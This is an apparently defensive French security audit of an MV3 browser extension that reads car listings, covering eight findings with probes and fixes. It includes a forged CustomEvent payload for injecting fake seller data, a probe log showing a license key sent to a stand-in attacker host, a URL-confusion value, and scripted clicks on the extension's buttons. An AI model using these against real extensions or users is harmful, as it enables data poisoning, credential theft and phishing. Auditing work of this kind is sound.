# Audit d'attaque — angle extension MV3

Relevé le 2026-09-23, branche `feat/api`. Périmètre : `extension/manifest.json`,
`extension/src`, `extension/popup`. Lecture intégrale des 50 fichiers de
`src/` et `popup/`, puis sondes jouées hors réseau (banc de tests de
l'extension, TestClient de l'API, base isolée `adscope_audit_ext` créée puis
détruite). Aucune requête vers leboncoin, La Centrale ou un tiers ; aucune
écriture dans la base `adscope`.

Sondes conservées : `/private/tmp/.../scratchpad/sonde-extension.mjs` (Node,
banc `extension/tests`) et `sonde_api.py` (TestClient). Elles ne sont pas
versionnées — elles n'ont rien à dire une fois les correctifs posés.

## Ce qui est sain, et vérifié

- **Aucun code distant, aucun `eval`.** Ni `eval`, ni `new Function`, ni
  `document.write`, ni script CDN : `popup/popup.html:87-104` ne charge que des
  fichiers locaux, et le CSP par défaut de MV3 s'applique.
- **Aucune injection de HTML.** Pas un seul `innerHTML` /
  `insertAdjacentHTML` / `outerHTML` dans `src/` ni `popup/` ; tout passe par
  `createElement` + `textContent` (`popup/dom.js:9-14`, `src/panel-node.js:9-21`).
  Le contenu de la page hôte — titre d'annonce, libellé d'ancienneté, nom du
  vendeur — n'est posé qu'en `textContent` ou en valeur d'attribut
  (`src/panel-cards.js:17-18`). `extension/tests/fiche.test.mjs:177` garde
  cette règle. **Rien à signaler sur l'échappement.**
- **`chrome.runtime.onMessage` (`src/sw.js:123`) n'est pas joignable depuis une
  page.** `externally_connectable` n'est pas déclaré : le défaut ferme les pages
  web, et les messages d'une autre extension iraient à `onMessageExternal`, qui
  n'est pas enregistré. Le défaut d'absence de contrôle de `sender` n'est donc
  pas exploitable **par ce chemin** — mais il l'est par le précédent (T1).
- **Le raisonnement CSRF tient.** `X-Adscope: 1` (`src/auth.js:11`) est bien
  hors de portée d'une page tierce : l'API n'ouvre aucun CORS (aucun
  `CORSMiddleware` dans `api/adscope_api/`), le prévol échouerait.
- **La donnée d'identité du vendeur particulier est bien écartée** côté
  extension (`src/sites/leboncoin.js:44-47`, `src/sites/lacentrale.js:34-37`)
  **et** côté API (`api/adscope_api/observations.py:112-117`). Le `siren`, le
  `user_id` et le `siret` ne sortent pas de la page. Une seule fuite subsiste,
  le code postal : voir T4.

---

## T1 — Un script de la page hôte fabrique des observations et les fait écrire en base au nom de l'utilisateur

**Gravité : haute.** `extension/src/feed.js:18-25`, `extension/src/detail.js:67-75`,
`extension/src/listing.js:92-113`, `extension/src/sync.js:61-89`,
`extension/src/sw.js:31-57`.

Le pont entre le monde MAIN et le monde de l'extension est un événement de
`window` :

```js
// src/sites/leboncoin-tap.js:22 — côté page
dispatchEvent(new CustomEvent(`adscope:${name}`, { detail: body }))

// src/feed.js:18-25 — côté extension
const on = (name, fn) =>
  addEventListener(`adscope:${name}`, ADS.context.guard((e) => {
    const ads = fromPayload(JSON.parse(e.detail))
    if (ads.length) fn(ads)
  }))
```

Aucune vérification de provenance : ni `e.isTrusted` (qui vaut de toute façon
`true` pour un `dispatchEvent` de page), ni jeton partagé, ni canal privé.
**N'importe quel script exécuté dans une page `www.leboncoin.fr` — une régie,
un tag manager, un script tiers compromis, une XSS, une autre extension
installée — peut émettre le même événement.** L'extension le prend pour la
charge que le navigateur a reçue, en tire des annonces, et les pousse vers
l'API par le service worker, qui les signe avec le cookie de session du
marchand (`src/sw.js:41` → `POST /v1/observations`).

### Scénario

1. La victime (un marchand connecté, session `adscope_session` valide) ouvre
   une page leboncoin qui charge un script tiers hostile.
2. Ce script exécute une ligne :
   `window.dispatchEvent(new CustomEvent('adscope:detail', {detail: JSON.stringify({ads:[…]})}))`,
   avec l'annonce de son choix : identifiant, prix, dates de publication et de
   remontée, `owner.type = 'pro'` et `store_id` = l'identifiant du **vendeur
   concurrent à salir**.
3. `detail.js` retient cette annonce (`pick`, `detail.js:57` — repli sur la
   première connue dès que la charge de la page n'en porte aucune : accueil,
   page de compte, résultats vides) et appelle `ADS.sync.send([forgée])`.
4. Le service worker POSTe l'observation. L'API l'accepte : c'est une session
   légitime.

### Preuve (sondes jouées)

`SONDE 1` (banc `extension/tests`, page leboncoin dont la charge est `{}`) :
un seul événement forgé suffit, et le corps émis vers l'API est exactement

```json
{"site":"lbc","site_id":"4242424242","price":1,"brand":"PEUGEOT","model":"208",
 "year":2020,"mileage":1,"seller_type":"pro","seller_id":"VENDEUR-CIBLE",
 "seller_name":"Garage à salir","published_at":"2023-01-05T08:00:00.000Z",
 "bumped_at":"2026-09-22T07:00:00.000Z","department":"75","postal_code":"75001"}
```

`SONDE 1bis` : par `adscope:payload`, la même chose sur une page de résultats —
l'annonce inventée est pastillée et transmise (le seul prérequis est un
`<a href="/ad/voitures/ID">` dans une carte, que l'attaquant écrit puisqu'il
tient la page). Et `feed.js:31-34` remplace `latest` : la charge forgée
**chasse** celle du site.

`SONDE_API` (TestClient, base isolée, session-cookie) : le même corps,
accepté et écrit :

```
POST /v1/observations : 200 {'accepted': 1, 'refused': 0}
GET /v1/sellers/lbc/VENDEUR-CIBLE : 200 {'listings': 1, 'over_a_month_share': 1.0,
  'median_age_days': 1357, 'seller_name': 'Garage à salir', …}
```

La section « Ce vendeur » du panneau, l'email du matin et le marché mutualisé
servent ensuite cette donnée à **tous** les marchands. C'est l'intégrité du
produit entier, pas le poste d'un utilisateur.

Deux variantes du même défaut, par le même canal :

- **`POST /v1/follows` à l'initiative de la page** : le bouton « Suivre » est
  un vrai nœud du DOM de la page (`src/panel-cards.js:53-57`) ; un
  `document.querySelector('.adscope-follow').click()` déclenche l'écouteur du
  monde isolé. Combiné à l'annonce forgée, la page choisit ce que le compte de
  la victime suit.
- **`POST /v1/disappearances`** : `src/absence.js:16-21` tire son verdict du
  `__NEXT_DATA__` de la page ; qui écrit la page écrit le verdict (il lui faut
  en plus un chemin dont les chiffres portent l'identifiant visé —
  `leboncoin.js:119`).

### Correctif proposé

1. **Le canal doit être privé.** Au lieu d'un événement de `window` nommé en
   clair : `src/sites/leboncoin-tap.js` (monde MAIN, `document_start`) crée un
   `MessageChannel` et pose un port sur un nœud éphémère que le content script
   relève et retire au premier `document_idle` ; ou, plus simple à écrire,
   l'extension **abandonne le tap** et lit `__NEXT_DATA__` à chaque navigation
   monopage (`navigation` / `popstate` + refetch de la charge via le service
   worker). Tant qu'un `CustomEvent` nommé reste le pont, il n'y a pas
   d'authentification possible du pair : tout ce que le monde MAIN sait, la
   page le sait.
2. **En attendant, ne plus faire confiance au contenu.** Dans `feed.js` :
   borner la taille de `e.detail` (refuser au-delà de ~4 Mo), n'accepter qu'une
   chaîne, et surtout **ne transmettre à l'API qu'une annonce dont une carte de
   la page porte l'adresse** — la règle que `listing.js` applique déjà — et,
   sur une fiche, **uniquement** l'annonce dont l'identifiant est celui de
   l'URL : supprimer le repli `|| listings[0]` de `detail.js:57`. Ce seul
   changement ferme la sonde 1.
3. **Côté API, poser un plafond par licence** (observations/jour, annonces
   distinctes/jour) et journaliser les émetteurs : une licence qui verse mille
   annonces qu'aucune autre ne voit jamais doit se voir.

---

## T2 — Le réglage « Adresse de l'API » envoie la clé de licence et le parcours de connexion vers n'importe quel hôte

**Gravité : haute.** `extension/popup/account.js:37-47`, `55-61`, `73-84` ;
`extension/popup/config.js:11-16` ; `extension/src/auth-notice.js:14-29` ;
`extension/manifest.json:20-22`.

Le champ est ouvert à tout utilisateur, sans liste blanche : `isBase` n'exige
qu'un `http(s)://hôte`. Enregistrer déclenche
`chrome.permissions.request({origins:['https://hôte-choisi/*']})`, que
`optional_host_permissions: ["https://*/*"]` couvre — le navigateur accorde.
Ensuite :

- **« Tester la connexion » envoie la clé de licence en clair** à cet hôte :
  `popup/config.js:16` pose `Authorization: Bearer <licenseKey>` sur
  `<hôte>/v1/me`. Si la clé configurée est celle d'une machine ou de
  l'opérateur, elle est exfiltrée en un clic.
- **Le bouton « Se connecter » de la fenêtre** ouvre
  `<hôte>/app/#/connexion` (`account.js:57`) — une page de connexion contrôlée
  par l'attaquant, présentée par l'extension elle-même.
- **La mention « adscope — reconnectez-vous »** posée *dans les pages
  leboncoin* (`src/auth-notice.js:29`) ouvre la même adresse. C'est le pire
  des trois : elle s'affiche précisément au moment où l'utilisateur s'attend à
  devoir ressaisir son mot de passe.
- Toutes les observations et tous les relevés partent désormais chez le tiers
  (`src/api.js:20`, `src/lookup.js:29`). Le cookie `adscope_session`, lui, ne
  suit pas (il est lié à son origine) — la session n'est pas volée, le mot de
  passe l'est par hameçonnage.

### Scénario

Un message au marchand — « pour activer le mode pro, collez cette adresse dans
Réglages → Adresse de l'API » —, ou simplement un poste partagé. Deux clics
plus tard, la clé est partie et le bouton de reconnexion de l'extension mène
chez l'attaquant.

### Preuve (sonde jouée)

`SONDE 2` (banc `extension/tests/popup-dom.mjs`) :

```
origines demandées : [{"origins":["https://hote-attaquant.example/*"]}]
appel sortant : https://hote-attaquant.example/v1/me
                {"headers":{"Authorization":"Bearer adsc_aaaa…aaaa"}}
bouton « Se connecter » ouvre : {"url":"https://hote-attaquant.example/app/#/connexion"}
```

`SONDE 2bis` : `src/auth-notice.js` relit `apiBase` du stockage et la mention
posée dans la page ouvre la même adresse.

### Correctif proposé

1. **Épingler l'adresse en production.** `API_BASE` devient une constante de
   build (`https://<domaine Render>`), déclarée en `host_permissions`. Le champ
   de saisie et `chrome.permissions.request` disparaissent de la fenêtre
   distribuée ; ils ne survivent que dans une variante de développement
   (`manifest.dev.json`).
2. **Si le champ doit rester**, le confronter à une liste blanche d'origines et
   la comparer sur `new URL(v).origin`, jamais sur la chaîne saisie :
   `isBase` accepte aujourd'hui `https://api.adscope.fr@evil.example`, dont
   l'origine est `evil.example`.
3. **Ne jamais envoyer la clé à une adresse non épinglée** : le bouton de test
   doit parler à l'adresse de production, pas à celle du champ.
4. **La mention dans la page ne doit pas suivre un réglage** : elle pointe la
   constante de build.

---

## T3 — Le tap du monde MAIN rediffuse les réponses de leboncoin à tous les scripts de la page

**Gravité : moyenne.** `extension/src/sites/leboncoin-tap.js:20-37`.

Le tap remplace `window.fetch` sur **toutes** les pages leboncoin, clone chaque
réponse dont l'URL contient `/_next/data/` ou `/finder/search`, et republie le
**corps entier** dans un `CustomEvent` de `window`. Cet événement est lisible
par tout script de la page : régie, mesure d'audience, tag manager. L'extension
prend donc une donnée que seul le code de leboncoin détenait et en donne copie
à des tiers qui ne l'avaient pas.

Le filtre `carries()` (présence de `"list_id"` et `"first_publication_date"`)
ne restreint pas au catalogue public : la charge d'une page de compte, des
favoris ou d'une recherche enregistrée les porte aussi, avec ce que le site y
met de l'utilisateur.

Deux effets de bord du même correctif :

- le patch n'est **jamais retiré** : après un rechargement ou une mise à jour de
  l'extension, le script orphelin du monde MAIN continue d'intercepter et de
  rediffuser (aucun garde `ADS.context` n'existe dans ce monde) ;
- `res.clone()` double en mémoire chaque réponse concernée.

**Preuve : par lecture, et par le banc existant** —
`extension/tests/tap.test.mjs:39-46` vérifie que la charge est « republiée
telle quelle », `detail` portant le corps intégral.

### Correctif proposé

Le monde MAIN doit publier **ce que l'extension consomme, pas ce qu'il a lu** :
appliquer `ADS.leboncoin.normalize` (ou une extraction minimale des champs de
`src/observation.js:14-26`) dans le tap et ne publier que ce tableau-là. Aucun
champ de compte, aucun corps brut. Et, à terme, le canal privé de T1, qui ferme
la rediffusion elle-même. Ajouter un `if (!window.__adscopeTap) …` et un moyen
de se désarmer quand le contexte de l'extension disparaît.

---

## T4 — Le code postal complet d'une annonce de particulier part vers l'API et y reste

**Gravité : moyenne.** `extension/src/sites/leboncoin.js:57`,
`extension/src/observation.js:25` ; côté base
`api/adscope_api/observations.py:32-34` et `103-106`,
`api/adscope_api/models.py:53`.

L'extension envoie `postal_code` pour **toute** annonce, sans regarder le type
de vendeur : `...VF.withZip(loc.zipcode, loc.department_id)` est appelé avant le
tri pro/particulier, et `observation.of` le recopie. L'API l'écrit sans plus de
tri : `postal_code` figure dans `VEHICLE_FIELDS`, appliqué à toute observation,
alors que `seller_id`/`seller_name` sont, eux, réservés aux professionnels
juste en dessous.

La règle affichée du produit est « aucune donnée de vendeur particulier n'est
conservée ». Un code postal complet, joint à un modèle exact, une année, un
kilométrage et un historique de prix daté, désigne un particulier dans une
commune : ce n'est pas un identifiant, c'en est l'équivalent pratique. Le
commentaire de `api/adscope_api/gauge.py:15` dit d'ailleurs pourquoi le
fragment est refusé — « rogné, il désigne une autre commune » : c'est bien une
donnée de localisation fine.

**Preuve (sonde jouée)** : dans la sonde API, la ligne écrite porte
`postal_code = 75001` ; avec `seller_type: 'private'` le comportement est
identique — seuls `seller_id`/`seller_name` sont effacés
(`observations.py:112-117`).

### Correctif proposé

Côté extension, ne composer `postalCode` que pour un vendeur professionnel, et
ne garder que le département sinon (il suffit au marché et aux facettes). Côté
API, refléter la même règle dans `observations.record` : `postal_code` n'est
écrit que si `observation.seller_type == "pro"`, et une migration efface celui
des annonces de particuliers déjà en base.

---

## T5 — L'extension distribuée pointe par défaut sur `http://localhost:8000`

**Gravité : moyenne.** `extension/src/api.js:8`,
`extension/src/auth-notice.js:14`, `extension/popup/account.js:89`,
`extension/manifest.json:16`.

`DEFAULTS = { apiBase: 'http://localhost:8000' }`. Sur un poste de marchand,
au premier lancement :

- les observations, les suivis et les constats d'absence sont POSTés vers
  `http://localhost:8000` — soit dans le vide, soit **vers ce qui écoute ce
  port sur la machine de l'utilisateur** (port de développement très commun),
  à qui l'extension livre alors le relevé des pages visitées ;
- `host_permissions` accorde d'office l'accès à `http://localhost:8000/*` à
  tous les utilisateurs de l'extension publiée ;
- et c'est ce défaut qui **oblige** à garder le champ de T2 : sans lui,
  personne ne peut joindre l'API de production.

**Preuve : par lecture** (constante, et `chrome.storage.local` vide à
l'installation).

### Correctif proposé

`apiBase` par défaut = l'origine de production, posée à la compilation ;
`http://localhost:8000` retiré de `host_permissions` dans la variante
distribuée. Un seul endroit doit porter cette constante — `src/api.js` — et
`auth-notice.js` comme `account.js` la lisent au lieu de la recopier.

---

## T6 — `optional_host_permissions: ["https://*/*"]` : au-delà du nécessaire, et retirable

**Gravité : moyenne.** `extension/manifest.json:20-22`.

Ce que ce motif achète : pouvoir demander l'accès à un domaine d'API **inconnu
à la compilation** (`popup/account.js:36-38`). Ce qu'il coûte :

- l'utilisateur voit, à l'installation, une extension capable de réclamer
  « lire et modifier vos données sur tous les sites » ; la revue du Chrome Web
  Store demande une justification que le produit ne peut pas donner — il ne
  parle qu'à deux sites et à sa propre API ;
- un seul clic dans la fenêtre accorde durablement un hôte arbitraire (T2) ;
- rien dans le code ne restreint la demande à une API : `access()` demande ce
  que le champ contient.

**Comment le retirer** — l'adresse de production est connue au moment de la
mise en ligne sur Render, donc :

1. `"host_permissions": ["https://<domaine de production>/*",
   "https://www.leboncoin.fr/*", "https://www.lacentrale.fr/*"]` ;
2. suppression complète de `optional_host_permissions` et de
   `chrome.permissions.request` côté fenêtre (le seul appel restant,
   `popup/alerts.js:20`, porte sur les origines du registre de sites, qui sont
   dans `host_permissions` — il continue de fonctionner) ;
3. `http://localhost:8000/*` et le champ d'adresse ne vivent plus que dans un
   manifeste de développement.

Les deux origines de sites doivent **rester** dans `host_permissions` : la
mesure du 2026-09-19 consignée dans `src/access.js:11-21` montre que
`permissions.contains` rend `false` sur une origine déclarée seulement en
`content_scripts.matches`, ce qui ferait crier au loup l'alerte d'accès.

---

## T7 — La page hôte déclenche les gestes de nos propres boutons

**Gravité : basse.** `extension/src/panel-cards.js:53-57`,
`extension/src/auth-notice.js:21-30`.

Le panneau et la mention de reconnexion sont des nœuds du DOM de la page ;
leurs écouteurs vivent dans le monde isolé mais reçoivent les événements que la
page émet. `document.querySelector('.adscope-follow').click()` fait suivre
l'annonce affichée au compte de la victime ;
`document.querySelector('.ads-auth-msg').click()` ouvre un onglet sur
`apiBase`. Aucun privilège n'est gagné (le `window.open` est celui de la page),
mais une écriture d'API part sans geste humain.

**Preuve : par lecture.** (Le banc simule le clic de la même façon —
`extension/tests/stage.mjs:34` : `click() { for (const fn of this.handlers.click) fn() }`.)

### Correctif proposé

N'accepter que les événements portant `event.isTrusted === true` **et** un
`detail`/`pointerId` cohérent avec un vrai clic ; à défaut, exiger deux gestes
pour le suivi (le bouton se met en attente de confirmation). Le peu que cela
coûte ferme un chemin d'écriture non consenti.

---

## T8 — `JSON.parse(e.detail)` sans garde de forme ni de taille

**Gravité : basse.** `extension/src/feed.js:22`.

Une page qui émet `adscope:payload` avec un `detail` non-JSON fait lever
`SyntaxError` dans l'écouteur : `ADS.context.guard` ne rattrape que « context
invalidated » (`src/context.js:36`) et relance — exception non gérée à chaque
événement. Avec un `detail` de plusieurs dizaines de mégaoctets, l'analyse
bloque le thread de la page à chaque émission.

**Preuve : par lecture.**

### Correctif proposé

Dans `feed.js` : `if (typeof e.detail !== 'string' || e.detail.length > 4e6) return`,
puis un `JSON.parse` sous `try/catch` qui rend `[]`.

---

## Note (hors trouvaille)

La clé de licence vit en clair dans `chrome.storage.local`
(`popup/account.js:24`), donc dans un fichier lisible par tout processus du
compte utilisateur. C'est la norme pour une extension et il n'y a pas mieux à
faire dans MV3 ; cela plaide seulement pour que la clé d'opérateur ne soit
jamais collée dans une fenêtre de marchand.

À vérifier dans un navigateur réel avant la mise en ligne (non jouable ici, et
ce n'est pas un défaut de sécurité) : le cookie `adscope_session` est posé en
`SameSite=lax` (`api/adscope_api/sessions.py:117`). Les requêtes du service
worker vers l'API sont initiées par une origine `chrome-extension://` ; il faut
constater que Chrome les traite bien comme same-site au titre de la permission
d'hôte, sans quoi le mode session de l'extension ne transporte aucun cookie en
production.
